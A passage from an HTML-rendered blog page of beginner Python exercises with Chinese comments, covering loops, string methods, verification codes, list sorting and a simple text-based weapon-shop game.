answer!=&#x27;y&#x27; or money &lt; 2:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;Exit the game, next time!&#x27;)</span><br><span class=\"line\">\t\t\t\tbreak</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"for-demo-py\"><a href=\"#for-demo-py\" class=\"headerlink\" title=\"for_demo.py\"></a>for_demo.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">语法：</span><br><span class=\"line\"></span><br><span class=\"line\">for 变量名 in 集合：</span><br><span class=\"line\">\t语句</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 使用range(start, end, step)函数完成范围指定</span><br><span class=\"line\"># 默认从0开始，不包含结尾数字，步长为1</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(4):</span><br><span class=\"line\">\tif i == 2:</span><br><span class=\"line\">\t\tprint(&#x27;a&#x27;)</span><br><span class=\"line\">\t\tbreak</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tprint(i)</span><br><span class=\"line\">print(&#x27;finish&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 注意：在python中，在for，while循环中没有变量的作用域，在其循环结构的内层或外层都可以获取变量的值</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"practice01-py\"><a href=\"#practice01-py\" class=\"headerlink\" title=\"practice01.py\"></a>practice01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># # 1.name 变量对应的值前三个字符逆序输出</span><br><span class=\"line\"></span><br><span class=\"line\"># name = &#x27;variable reverse print&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># print(name[-20::-1])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># # 2. 敏感词过滤</span><br><span class=\"line\"></span><br><span class=\"line\"># input_string1 = input(&#x27;please input: &#x27;)</span><br><span class=\"line\"># input_string = input_string1.lower()</span><br><span class=\"line\"></span><br><span class=\"line\"># if input_string.find(&#x27;teacher cang&#x27;) != -1 or input_string.find(&#x27;tokyo hot&#x27;) != -1:</span><br><span class=\"line\"># \ts1 = input_string.replace(&#x27;teacher cang&#x27;,&#x27;***&#x27;)</span><br><span class=\"line\"># \tprint(s1)</span><br><span class=\"line\"># \tif s1.find(&#x27;tokyo hot&#x27;) != -1:</span><br><span class=\"line\"># \t\tprint(s1.replace(&#x27;tokyo hot&#x27;, &#x27;***&#x27;))</span><br><span class=\"line\"># else:</span><br><span class=\"line\"># \tprint(input_string1.capitalize())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># # 3. 循环输入用户信息</span><br><span class=\"line\"># 方法一</span><br><span class=\"line\"># list1 = []</span><br><span class=\"line\"># dict1 = &#123;&#125;</span><br><span class=\"line\"># while True:</span><br><span class=\"line\"># \tuser_name = input(&#x27;please input user_name(maximun length is 20): &#x27;)</span><br><span class=\"line\"># \tpassword = input(&#x27;please input password(maximun length is 20): &#x27;)</span><br><span class=\"line\"># \temail_account = input(&#x27;please input email_account(maximun length is 20): &#x27;)</span><br><span class=\"line\"># \tuser_name1 = user_name.capitalize()</span><br><span class=\"line\"># \temail_account1 = email_account.lower()</span><br><span class=\"line\"># \tdict1[&#x27;user_name&#x27;] = user_name1[:20] # </span><br><span class=\"line\"># \tdict1[&#x27;password&#x27;] = password[:20]</span><br><span class=\"line\"># \tdict1[&#x27;email_account&#x27;] = email_account1[:20]</span><br><span class=\"line\"># \tprint(dict1)</span><br><span class=\"line\"># \tlist1.append(dict1)</span><br><span class=\"line\"># \tprint(list1)</span><br><span class=\"line\"># \tif user_name.lower() == &#x27;q&#x27; or password.lower() == &#x27;q&#x27; or email_account.lower() == &#x27;q&#x27;:</span><br><span class=\"line\"># \t\tbreak</span><br><span class=\"line\"># \tprint(&#x27;user_name\\tpassword\\temail_account&#x27;)</span><br><span class=\"line\"># \tfor i in list1:</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"># \t\tfor value in i.values():</span><br><span class=\"line\"># \t\t\tprint(&#x27;  &#x27;,value, end=&#x27;\\t&#x27;)</span><br><span class=\"line\"># \t\tprint(&#x27;&#x27;)</span><br><span class=\"line\"># \tprint(&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二</span><br><span class=\"line\">s=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">\tuser_name = input(&#x27;please input user_name(maximun length is 20): &#x27;)</span><br><span class=\"line\">\tpassword = input(&#x27;please input password(maximun length is 20): &#x27;)</span><br><span class=\"line\">\temail_account = input(&#x27;please input email_account(maximun length is 20): &#x27;)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tuser_name = user_name[:20]\t</span><br><span class=\"line\">\tpassword = password[:20]</span><br><span class=\"line\">\temail = email_account[:20]</span><br><span class=\"line\"></span><br><span class=\"line\">\tmsg = &#x27;&#123;&#125;\\t&#123;&#125;\\t&#123;&#125;\\n&#x27;.format(user_name,password,email)</span><br><span class=\"line\"></span><br><span class=\"line\">\tmsg = msg.expandtabs(20)</span><br><span class=\"line\"></span><br><span class=\"line\">\ts+=msg</span><br><span class=\"line\"></span><br><span class=\"line\">\tif user_name==&#x27;q&#x27; or user_name==&#x27;Q&#x27; or \\</span><br><span class=\"line\">\tpassword==&#x27;q&#x27; or password==&#x27;Q&#x27; or email==&#x27;q&#x27; or email==&#x27;Q&#x27;:</span><br><span class=\"line\">\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">print(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 4. 验证码验证</span><br><span class=\"line\"></span><br><span class=\"line\"># import random</span><br><span class=\"line\"></span><br><span class=\"line\"># string = &#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># while True:</span><br><span class=\"line\"># \ti=0</span><br><span class=\"line\"># \ts1 = &#x27;&#x27;</span><br><span class=\"line\"># \twhile i &lt; 4:</span><br><span class=\"line\"># \t\tnum = random.randint(0, len(string)-1)</span><br><span class=\"line\"># \t\ts1 += string[num]</span><br><span class=\"line\"># \t\ti += 1</span><br><span class=\"line\"># \tprint(&#x27;verification code is:%s&#x27; %s1)</span><br><span class=\"line\"># \tuser = input(&#x27;please input user_name: &#x27;)</span><br><span class=\"line\"># \tpasswordN = input(&#x27;please input password: &#x27;)</span><br><span class=\"line\"># \tcode = input(&#x27;please input verification code: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># \tif user == &#x27;xiaoming&#x27; and passwordN == &#x27;1234&#x27; and code.lower() == s1.lower():</span><br><span class=\"line\"># \t\tprint(&#x27;Login success!&#x27;)</span><br><span class=\"line\"># \t\tbreak</span><br><span class=\"line\"># \tprint(&#x27;Your info is incorrect, please input again!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 5. 输入两个字符串，从第一个字符串中删除第二个字符串包含的所有字符</span><br><span class=\"line\"></span><br><span class=\"line\"># str1 = input(&#x27;please input string1: &#x27;)</span><br><span class=\"line\"># str2 = input(&#x27;please input string2: &#x27;)</span><br><span class=\"line\"># str3 = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一</span><br><span class=\"line\"># for i in str1:</span><br><span class=\"line\"># \tif i not in str2:</span><br><span class=\"line\"># \t\tstr3 += i</span><br><span class=\"line\">\t</span><br><span class=\"line\"># print(str3)</span><br><span class=\"line\"># str1 = str3</span><br><span class=\"line\"># print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二</span><br><span class=\"line\"># for i in str2:</span><br><span class=\"line\"># \tstr1 = str1.replace(i, &#x27;&#x27;)</span><br><span class=\"line\"># print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法三</span><br><span class=\"line\"># for i in str2:</span><br><span class=\"line\"># \tif i not in str3:</span><br><span class=\"line\"># \t\tstr3+=i</span><br><span class=\"line\"># print(str3)  # 去除重复项</span><br><span class=\"line\"></span><br><span class=\"line\"># for i in str3:</span><br><span class=\"line\"># \tstr1 = str1.replace(i, &#x27;&#x27;)</span><br><span class=\"line\"># print(str1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 6. 输入一行字符，统计单词的个数，每两个单词以空格隔开</span><br><span class=\"line\"></span><br><span class=\"line\"># str1 = input(&#x27;please input a string: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># count = 0</span><br><span class=\"line\"># for i in str1:</span><br><span class=\"line\"># \tif i == &#x27; &#x27;:</span><br><span class=\"line\"># \t\tcount += 1</span><br><span class=\"line\"># print(f&#x27;There are &#123;count+1&#125; words in str1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 7. 输入一个单词，单词特性：每个字母都大写且没有连续相同的字母，如果该特性不满足则重新输入</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一</span><br><span class=\"line\"># while True:</span><br><span class=\"line\"># \tstr1 = input(&#x27;please input a word: &#x27;)</span><br><span class=\"line\"># \tif not str1.isupper():</span><br><span class=\"line\"># \t\tprint(&#x27;please input again&#x27;)</span><br><span class=\"line\"># \t\tcontinue</span><br><span class=\"line\"># \ti = 0</span><br><span class=\"line\"># \twhile i &lt; len(str1)-1:</span><br><span class=\"line\"># \t\tif str1[i] != str1[i+1]:</span><br><span class=\"line\"># \t\t\ti += 1</span><br><span class=\"line\"># \t\t\tcontinue</span><br><span class=\"line\"># \t\telse:</span><br><span class=\"line\"># \t\t\tprint(&#x27;please input again&#x27;)</span><br><span class=\"line\"># \t\t\tbreak</span><br><span class=\"line\"># \telse:</span><br><span class=\"line\"># \t\tprint(&#x27;The word is ok&#x27;)</span><br><span class=\"line\"># \t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二</span><br><span class=\"line\"># while True:</span><br><span class=\"line\"># \tword = input(&#x27;please input a word: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># \tfor i in range(len(word)):</span><br><span class=\"line\"># \t\tif word[i]&lt;&#x27;A&#x27; or word[i]&gt;&#x27;Z&#x27;:</span><br><span class=\"line\"># \t\t\tprint(&#x27;please input again&#x27;)</span><br><span class=\"line\"># \t\t\tbreak</span><br><span class=\"line\"># \t\telse:</span><br><span class=\"line\"># \t\t\tif i&lt;len(word)-1 and word[i]==word[i+1]:</span><br><span class=\"line\"># \t\t\t\tprint(&#x27;please input again&#x27;)</span><br><span class=\"line\"># \t\t\t\tbreak</span><br><span class=\"line\"># \telse:</span><br><span class=\"line\"># \t\tprint(&#x27;The word is ok&#x27;)</span><br><span class=\"line\"># \t\tbreak</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"string-method-py\"><a href=\"#string-method-py\" class=\"headerlink\" title=\"string_method.py\"></a>string_method.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 字符串的内建函数：声明一个字符串，默认可以调用内建函数</span><br><span class=\"line\"></span><br><span class=\"line\"># 第一部分：大小写相关</span><br><span class=\"line\"># capitalize()第一个单词首字母大写, title()每个单词首字母大写, istitle()判断是否是title格式, </span><br><span class=\"line\"># upper()所有字母大写, isupper(), lower()所有字母小写, islower()</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;zhaorui is a beautiful girl!&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">msg = message.capitalize()</span><br><span class=\"line\">print(msg)</span><br><span class=\"line\"></span><br><span class=\"line\"># 案例：生成验证码</span><br><span class=\"line\"></span><br><span class=\"line\"># s=&#x27;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm0987654321&#x27;</span><br><span class=\"line\"># print(len(s))</span><br><span class=\"line\"># # 四个随机数</span><br><span class=\"line\"># code = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># import random</span><br><span class=\"line\"></span><br><span class=\"line\"># # IndexError: string index out of range  ex:print(s[62])</span><br><span class=\"line\"># # index: 0~len(s)-1  0-61</span><br><span class=\"line\">\t</span><br><span class=\"line\"># for i in range(4):\t\t</span><br><span class=\"line\"># \tran = random.randint(0,len(s)-1)</span><br><span class=\"line\"></span><br><span class=\"line\"># \tcode += s[ran] </span><br><span class=\"line\"></span><br><span class=\"line\"># print(&#x27;Verification Code:&#x27;+code)</span><br><span class=\"line\"></span><br><span class=\"line\"># # 提示用户输入验证码</span><br><span class=\"line\"># user_input = input(&#x27;please input your verification code: &#x27;)</span><br><span class=\"line\"># if user_input.lower() == code.lower():</span><br><span class=\"line\"># \tprint(&#x27;Verification code is correct!&#x27;)</span><br><span class=\"line\"># else:</span><br><span class=\"line\"># \tprint(&#x27;Verification code is incorrect!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串查找，替换</span><br><span class=\"line\"># find(), rfind(), lfind(), index(), rindex(), lindex(), replace()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串内建函数： encode 编码, decode 解码</span><br><span class=\"line\"></span><br><span class=\"line\"># 编码：  网络应用 （中文一般涉及编码问题）</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;上课了！请认真听课！&#x27; # 中文的</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">https://www.baidu.com/s?wd=%E4%BB%8A%E6%97%A5%E6%96%B0%E9%B2%9C%E4%BA%8B&amp;tn=SE_Pclogo_6ysd4c7a&amp;sa=ire_dl_gh_logo&amp;rsv_dl=igh_logo_pc</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># gbk 中文  gb2312 简体中文   unicode 统一编码 升级到 utf-8</span><br><span class=\"line\">result = msg.encode(&#x27;utf-8&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 解码</span><br><span class=\"line\">m = result.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">print(m)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串内建函数： startswith()  endswith()  返回值都是布尔类型True False</span><br><span class=\"line\"></span><br><span class=\"line\"># startswith判断是否是以xxx开头，或者endswith判断是否是以xxx结尾的</span><br><span class=\"line\"></span><br><span class=\"line\"># 应用：文件上传: 只能上传图片（jpg,png,bmp,gif）</span><br><span class=\"line\"></span><br><span class=\"line\">filename = &#x27;note.doc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = filename.endswith(&#x27;doc&#x27;) # 文件是否是以txt结尾</span><br><span class=\"line\"></span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">s = &#x27;hello&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result = s.startswith(&#x27;he&#x27;)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 文件上传: 只能上传图片（jpg,png,bmp,gif）</span><br><span class=\"line\"></span><br><span class=\"line\">path = input(&#x27;please select files: &#x27;) # 输入路径和文件名</span><br><span class=\"line\"></span><br><span class=\"line\"># 分析： 通过文件路径 ---&gt;文件名---&gt;判断是否是图片类型</span><br><span class=\"line\">p = path.rfind(&#x27;\\\\&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">filename = path[p+1:]</span><br><span class=\"line\"></span><br><span class=\"line\"># 判断是否是图片类型</span><br><span class=\"line\"></span><br><span class=\"line\">if filename.endswith(&#x27;jpg&#x27;) \\</span><br><span class=\"line\"> or filename.endswith(&#x27;png&#x27;) or filename.endswith(&#x27;bmp&#x27;) or filename.endswith(&#x27;gif&#x27;):</span><br><span class=\"line\"> \tprint(&#x27;The file is picture, upload is granted&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;The file is not picture, only picture is granted&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"list01-py\"><a href=\"#list01-py\" class=\"headerlink\" title=\"list01.py\"></a>list01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># brands = [&#x27;hp&#x27;, &#x27;dell&#x27;, &#x27;thinkpad&#x27;, &#x27;支持华为&#x27;, &#x27;lenovo&#x27;, &#x27;mac&#x27;, &#x27;神州&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># # 修改</span><br><span class=\"line\"># brands[6]=&#x27;Hasee&#x27;</span><br><span class=\"line\"># print(brands)</span><br><span class=\"line\"></span><br><span class=\"line\"># for i in range(len(brands)):</span><br><span class=\"line\"># \tif &#x27;华为&#x27; in brands[i]:</span><br><span class=\"line\"># \t\tbrands[i]=&#x27;HUAWEI&#x27;</span><br><span class=\"line\"># \t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\"># print(brands)</span><br><span class=\"line\"></span><br><span class=\"line\"># # 删除</span><br><span class=\"line\"># del brands[2]</span><br><span class=\"line\"># print(brands)</span><br><span class=\"line\"></span><br><span class=\"line\"># l=len(brands)</span><br><span class=\"line\"># i=0</span><br><span class=\"line\"># while i&lt;l:</span><br><span class=\"line\"># \tif &#x27;hp&#x27; in brands[i] or &#x27;mac&#x27; in brands[i]:</span><br><span class=\"line\"># \t\tdel brands[i]</span><br><span class=\"line\"># \t\tl-=1</span><br><span class=\"line\"></span><br><span class=\"line\"># \ti+=1</span><br><span class=\"line\"># print(brands)</span><br><span class=\"line\"></span><br><span class=\"line\"># 根据输入的内容删除列表内的元素</span><br><span class=\"line\"></span><br><span class=\"line\"># words = [&#x27;hello&#x27;,&#x27;good&#x27;,&#x27;apple&#x27;,&#x27;world&#x27;,&#x27;digit&#x27;,&#x27;alpha&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\"># w = input(&#x27;please input a word: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># for i in range(len(words)-1):</span><br><span class=\"line\"># \tif w in words[i]:</span><br><span class=\"line\"># \t\tdel words[i]</span><br><span class=\"line\"># print(words)</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加</span><br><span class=\"line\"># 产生10个随机数保存到列表</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">random_list = []</span><br><span class=\"line\"></span><br><span class=\"line\"># for i in range(10):</span><br><span class=\"line\"># \tran = random.randint(1,20)</span><br><span class=\"line\"></span><br><span class=\"line\"># \trandom_list.append(ran)</span><br><span class=\"line\"># print(random_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 产生10个不同的随机数保存到列表</span><br><span class=\"line\"></span><br><span class=\"line\">i=0</span><br><span class=\"line\"></span><br><span class=\"line\">while i&lt;10:</span><br><span class=\"line\">\tran = random.randint(1,20)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif ran not in random_list:</span><br><span class=\"line\">\t\trandom_list.append(ran)</span><br><span class=\"line\">\t\ti+=1</span><br><span class=\"line\">print(random_list)</span><br><span class=\"line\"></span><br><span class=\"line\"># 找最大值</span><br><span class=\"line\">max_value = max(random_list)</span><br><span class=\"line\">print(max_value)</span><br><span class=\"line\"># 找最小值</span><br><span class=\"line\">min_value = min(random_list)</span><br><span class=\"line\">print(min_value)</span><br><span class=\"line\"># 求和</span><br><span class=\"line\">sum1 = sum(random_list)</span><br><span class=\"line\">print(sum1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------get max and min value and sum by self define------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">mvalue = random_list[0]</span><br><span class=\"line\">minvalue = random_list[0]</span><br><span class=\"line\">sum2 = 0</span><br><span class=\"line\"></span><br><span class=\"line\">for value in random_list:</span><br><span class=\"line\">\tsum2+=value</span><br><span class=\"line\">\tif mvalue &lt; value:</span><br><span class=\"line\">\t\tmvalue=value</span><br><span class=\"line\">\tif minvalue &gt; value:</span><br><span class=\"line\">\t\tminvalue=value</span><br><span class=\"line\"></span><br><span class=\"line\">print(mvalue) </span><br><span class=\"line\">print(minvalue)</span><br><span class=\"line\">print(sum2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 排序： sorted() 默认升序</span><br><span class=\"line\"># sorted(list) / list.sort() 升序</span><br><span class=\"line\"># sorted(list, reverse=True) / list.sort(reverse=True) 降序</span><br><span class=\"line\"></span><br><span class=\"line\">random_list.sort()</span><br><span class=\"line\">print(random_list)</span><br><span class=\"line\"></span><br><span class=\"line\">new_list2 = sorted(random_list,reverse=True)</span><br><span class=\"line\">print(new_list2)</span><br><span class=\"line\"></span><br><span class=\"line\"># 自己写： 冒泡排序</span><br><span class=\"line\"></span><br><span class=\"line\"># for i in range(len(random_list)-1):</span><br><span class=\"line\"># \tfor j in range(len(random_list)-1-i):</span><br><span class=\"line\"># \t\tif random_list[j] &gt; random_list[j+1]:</span><br><span class=\"line\"># \t\t\tnum1 = random_list[j]</span><br><span class=\"line\"># \t\t\trandom_list[j] = random_list[j+1]</span><br><span class=\"line\"># \t\t\trandom_list[j+1] = num1</span><br><span class=\"line\"># print(random_list)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(len(random_list)-1):</span><br><span class=\"line\">\tfor j in range(len(random_list)-1-i):</span><br><span class=\"line\">\t\tif random_list[j] &gt; random_list[j+1]:</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\trandom_list[j],random_list[j+1] = random_list[j+1],random_list[j]</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">print(random_list)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># enumerate(list) 枚举 返回 index value</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"list02-py\"><a href=\"#list02-py\" class=\"headerlink\" title=\"list02.py\"></a>list02.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">列表支持的符号</span><br><span class=\"line\">+</span><br><span class=\"line\">*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">l1=[1,2,3]</span><br><span class=\"line\">l2=[5,6,7]</span><br><span class=\"line\"></span><br><span class=\"line\">l3=l1+l2 # 拼接</span><br><span class=\"line\">print(l3)</span><br><span class=\"line\"></span><br><span class=\"line\">l4=[5,8]*3 # 原列表内的元素复制3次</span><br><span class=\"line\">print(l4)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">result = [3,2] in [1,2,[3,2,1],4,5]</span><br><span class=\"line\">print(result) # False</span><br><span class=\"line\"></span><br><span class=\"line\"># print(int[4,5]) # 列表不能转整型</span><br><span class=\"line\">print(int(&#x27;45&#x27;)) # 字符串可转整型</span><br><span class=\"line\"></span><br><span class=\"line\"># 队列： 先进先出  FIFO -- first in first out</span><br><span class=\"line\"></span><br><span class=\"line\"># 栈：  先进后出 list.pop() -- 弹栈  默认移除列表最后一个元素，可指定下标</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"game-py\"><a href=\"#game-py\" class=\"headerlink\" title=\"game.py\"></a>game.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 游戏：</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">\t1.选择人物</span><br><span class=\"line\">\t2.购买武器 金币</span><br><span class=\"line\">\t3.打仗 赢得金币</span><br><span class=\"line\">\t4.选择删除武器</span><br><span class=\"line\">\t5.查看武器</span><br><span class=\"line\">\t6.退出游戏</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;*&#x27;*40)</span><br><span class=\"line\">print(&#x27;\\twelcom to King and Honor&#x27;)</span><br><span class=\"line\">print(&#x27;*&#x27;*40)</span><br><span class=\"line\"></span><br><span class=\"line\">role = input(&#x27;please input a role:(1.LuBan 2.HouYi 3.LiBai 4.SunShangxiang 5.DiaoChan 6.ZhuGeliang)&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">coins = 1000</span><br><span class=\"line\"></span><br><span class=\"line\">weapon_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;&#123;1&#125;, welcome to King and Honor, your current coins is:&#123;0&#125;&#x27;.format(coins,role)) # 指定参数位置</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">\tchoice = int(input(&#x27;\\nplease select:\\n 1.Buy a weapon\\n \\</span><br><span class=\"line\">2.Fight\\n 3.Delete a weapon\\n 4.Check weapon\\n 5.Exit\\n&#x27;))</span><br><span class=\"line\">\tif choice==1:</span><br><span class=\"line\">\t\tprint(&#x27;welcome to weapons inventory:&#x27;)</span><br><span class=\"line\">\t\tweapons = [[&#x27;Vorpal Blade&#x27;,500],[&#x27;Sakura gun&#x27;,400], \\</span><br><span class=\"line\">[&#x27;98k&#x27;,1000],[&#x27;Grenade&#x27;,800],[&#x27;Crimson Sabre&#x27;,700],[&#x27;Feather fan&#x27;,800]]</span><br><span class=\"line\">\t\tfor weapon in weapons:</span><br><span class=\"line\">\t\t\tprint(weapon[0],weapon[1],sep=&#x27;\\t&#x27;)</span><br><span class=\"line\">\t\tweaponname = input(&#x27;please input the weapon\\&#x27;s name you want to buy: &#x27;)</span><br><span class=\"line\">\t\t# 1.原来是否购买过该武器</span><br><span class=\"line\">\t\tif weaponname not in weapon_list:</span><br><span class=\"line\">\t\t# 2.输入的武器是否在武器库</span><br><span class=\"line\">\t\t\tfor weapon in weapons:</span><br><span class=\"line\">\t\t\t\tif weaponname == weapon[0]:</span><br><span class=\"line\">\t\t\t\t\tif coins &gt;= weapon[1]:</span><br><span class=\"line\">\t\t\t\t\t\tcoins-=weapon[1]</span><br><span class=\"line\">\t\t\t\t\t\tweapon_list.append(weapon[0])</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;&#123;&#125; purchase &#123;&#125; success!&#x27;.format(role,weaponname))</span><br><span class=\"line\">\t\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;Insufficient coins, please earn some by fight first&#x27;)</span><br><span class=\"line\">\t\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\telse:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;weaponname is wrong&#x27;)</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;You have this weapon already!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\telif choice==2:</span><br><span class=\"line\">\t\tprint(&#x27;enter battle field......&#x27;)</span><br><span class=\"line\">\t\tif len(weapon_list)&gt;0:</span><br><span class=\"line\">\t\t\tprint(&#x27;&#123;&#125; has following weapons:&#x27;.format(role))</span><br><span class=\"line\">\t\t\tfor weapon in weapon_list:</span><br><span class=\"line\">\t\t\t\tprint(weapon)</span><br><span class=\"line\">\t\t\twhile True:</span><br><span class=\"line\">\t\t\t\tweaponname = input(&#x27;please select: &#x27;)</span><br><span class=\"line\">\t\t\t\tif weaponname in weapon_list:</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tran1 = random.randint(1,20)</span><br><span class=\"line\">\t\t\t\t\tran2 = random.randint(1,20)</span><br><span class=\"line\">\t\t\t\t\tif ran1&gt;ran2:</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;In this fight: Zhangfei win!!!&#x27;)</span><br><span class=\"line\">\t\t\t\t\telif ran1&lt;ran2:</span><br><span class=\"line\">\t\t\t\t\t\tcoins+=200</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;In this fight: &#123;&#125; win! Coins:&#123;&#125;&#x27;.format(role,coins))</span><br><span class=\"line\">\t\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;In this fight, deuce, you can fight again!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\tprint(&#x27;The weapon you select is not exist, please select again!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;You has not brought a weapon yet, please buy a weapon first!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\telif choice==3:</span><br><span class=\"line\">\t\tprint(&#x27;Too many weapons, too heavy, discard some.....&#x27;)</span><br><span class=\"line\">\t\tif len(weapon_list)&gt;0:</span><br><span class=\"line\">\t\t\tprint(&#x27;&#123;&#125; has following weapons:&#x27;.format(role))</span><br><span class=\"line\">\t\t\tfor weapon in weapon_list:</span><br><span class=\"line\">\t\t\t\tprint(weapon)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\twhile True:</span><br><span class=\"line\">\t\t\t\tweaponname = input(&#x27;please input the weapon\\&#x27;s name you want to delete:&#x27;)</span><br><span class=\"line\">\t\t\t\tif weaponname in weapon_list:</span><br><span class=\"line\">\t\t\t\t\t# delete weapon: remove(obj), pop(index), clear, del weapon_list[index]</span><br><span class=\"line\">\t\t\t\t\tweapon_list.remove(weaponname)</span><br><span class=\"line\">\t\t\t\t\t# Refund coins</span><br><span class=\"line\">\t\t\t\t\t# print(weaponname)</span><br><span class=\"line\">\t\t\t\t\tfor weapon in weapons:</span><br><span class=\"line\">\t\t\t\t\t\tif weaponname == weapon[0]:</span><br><span 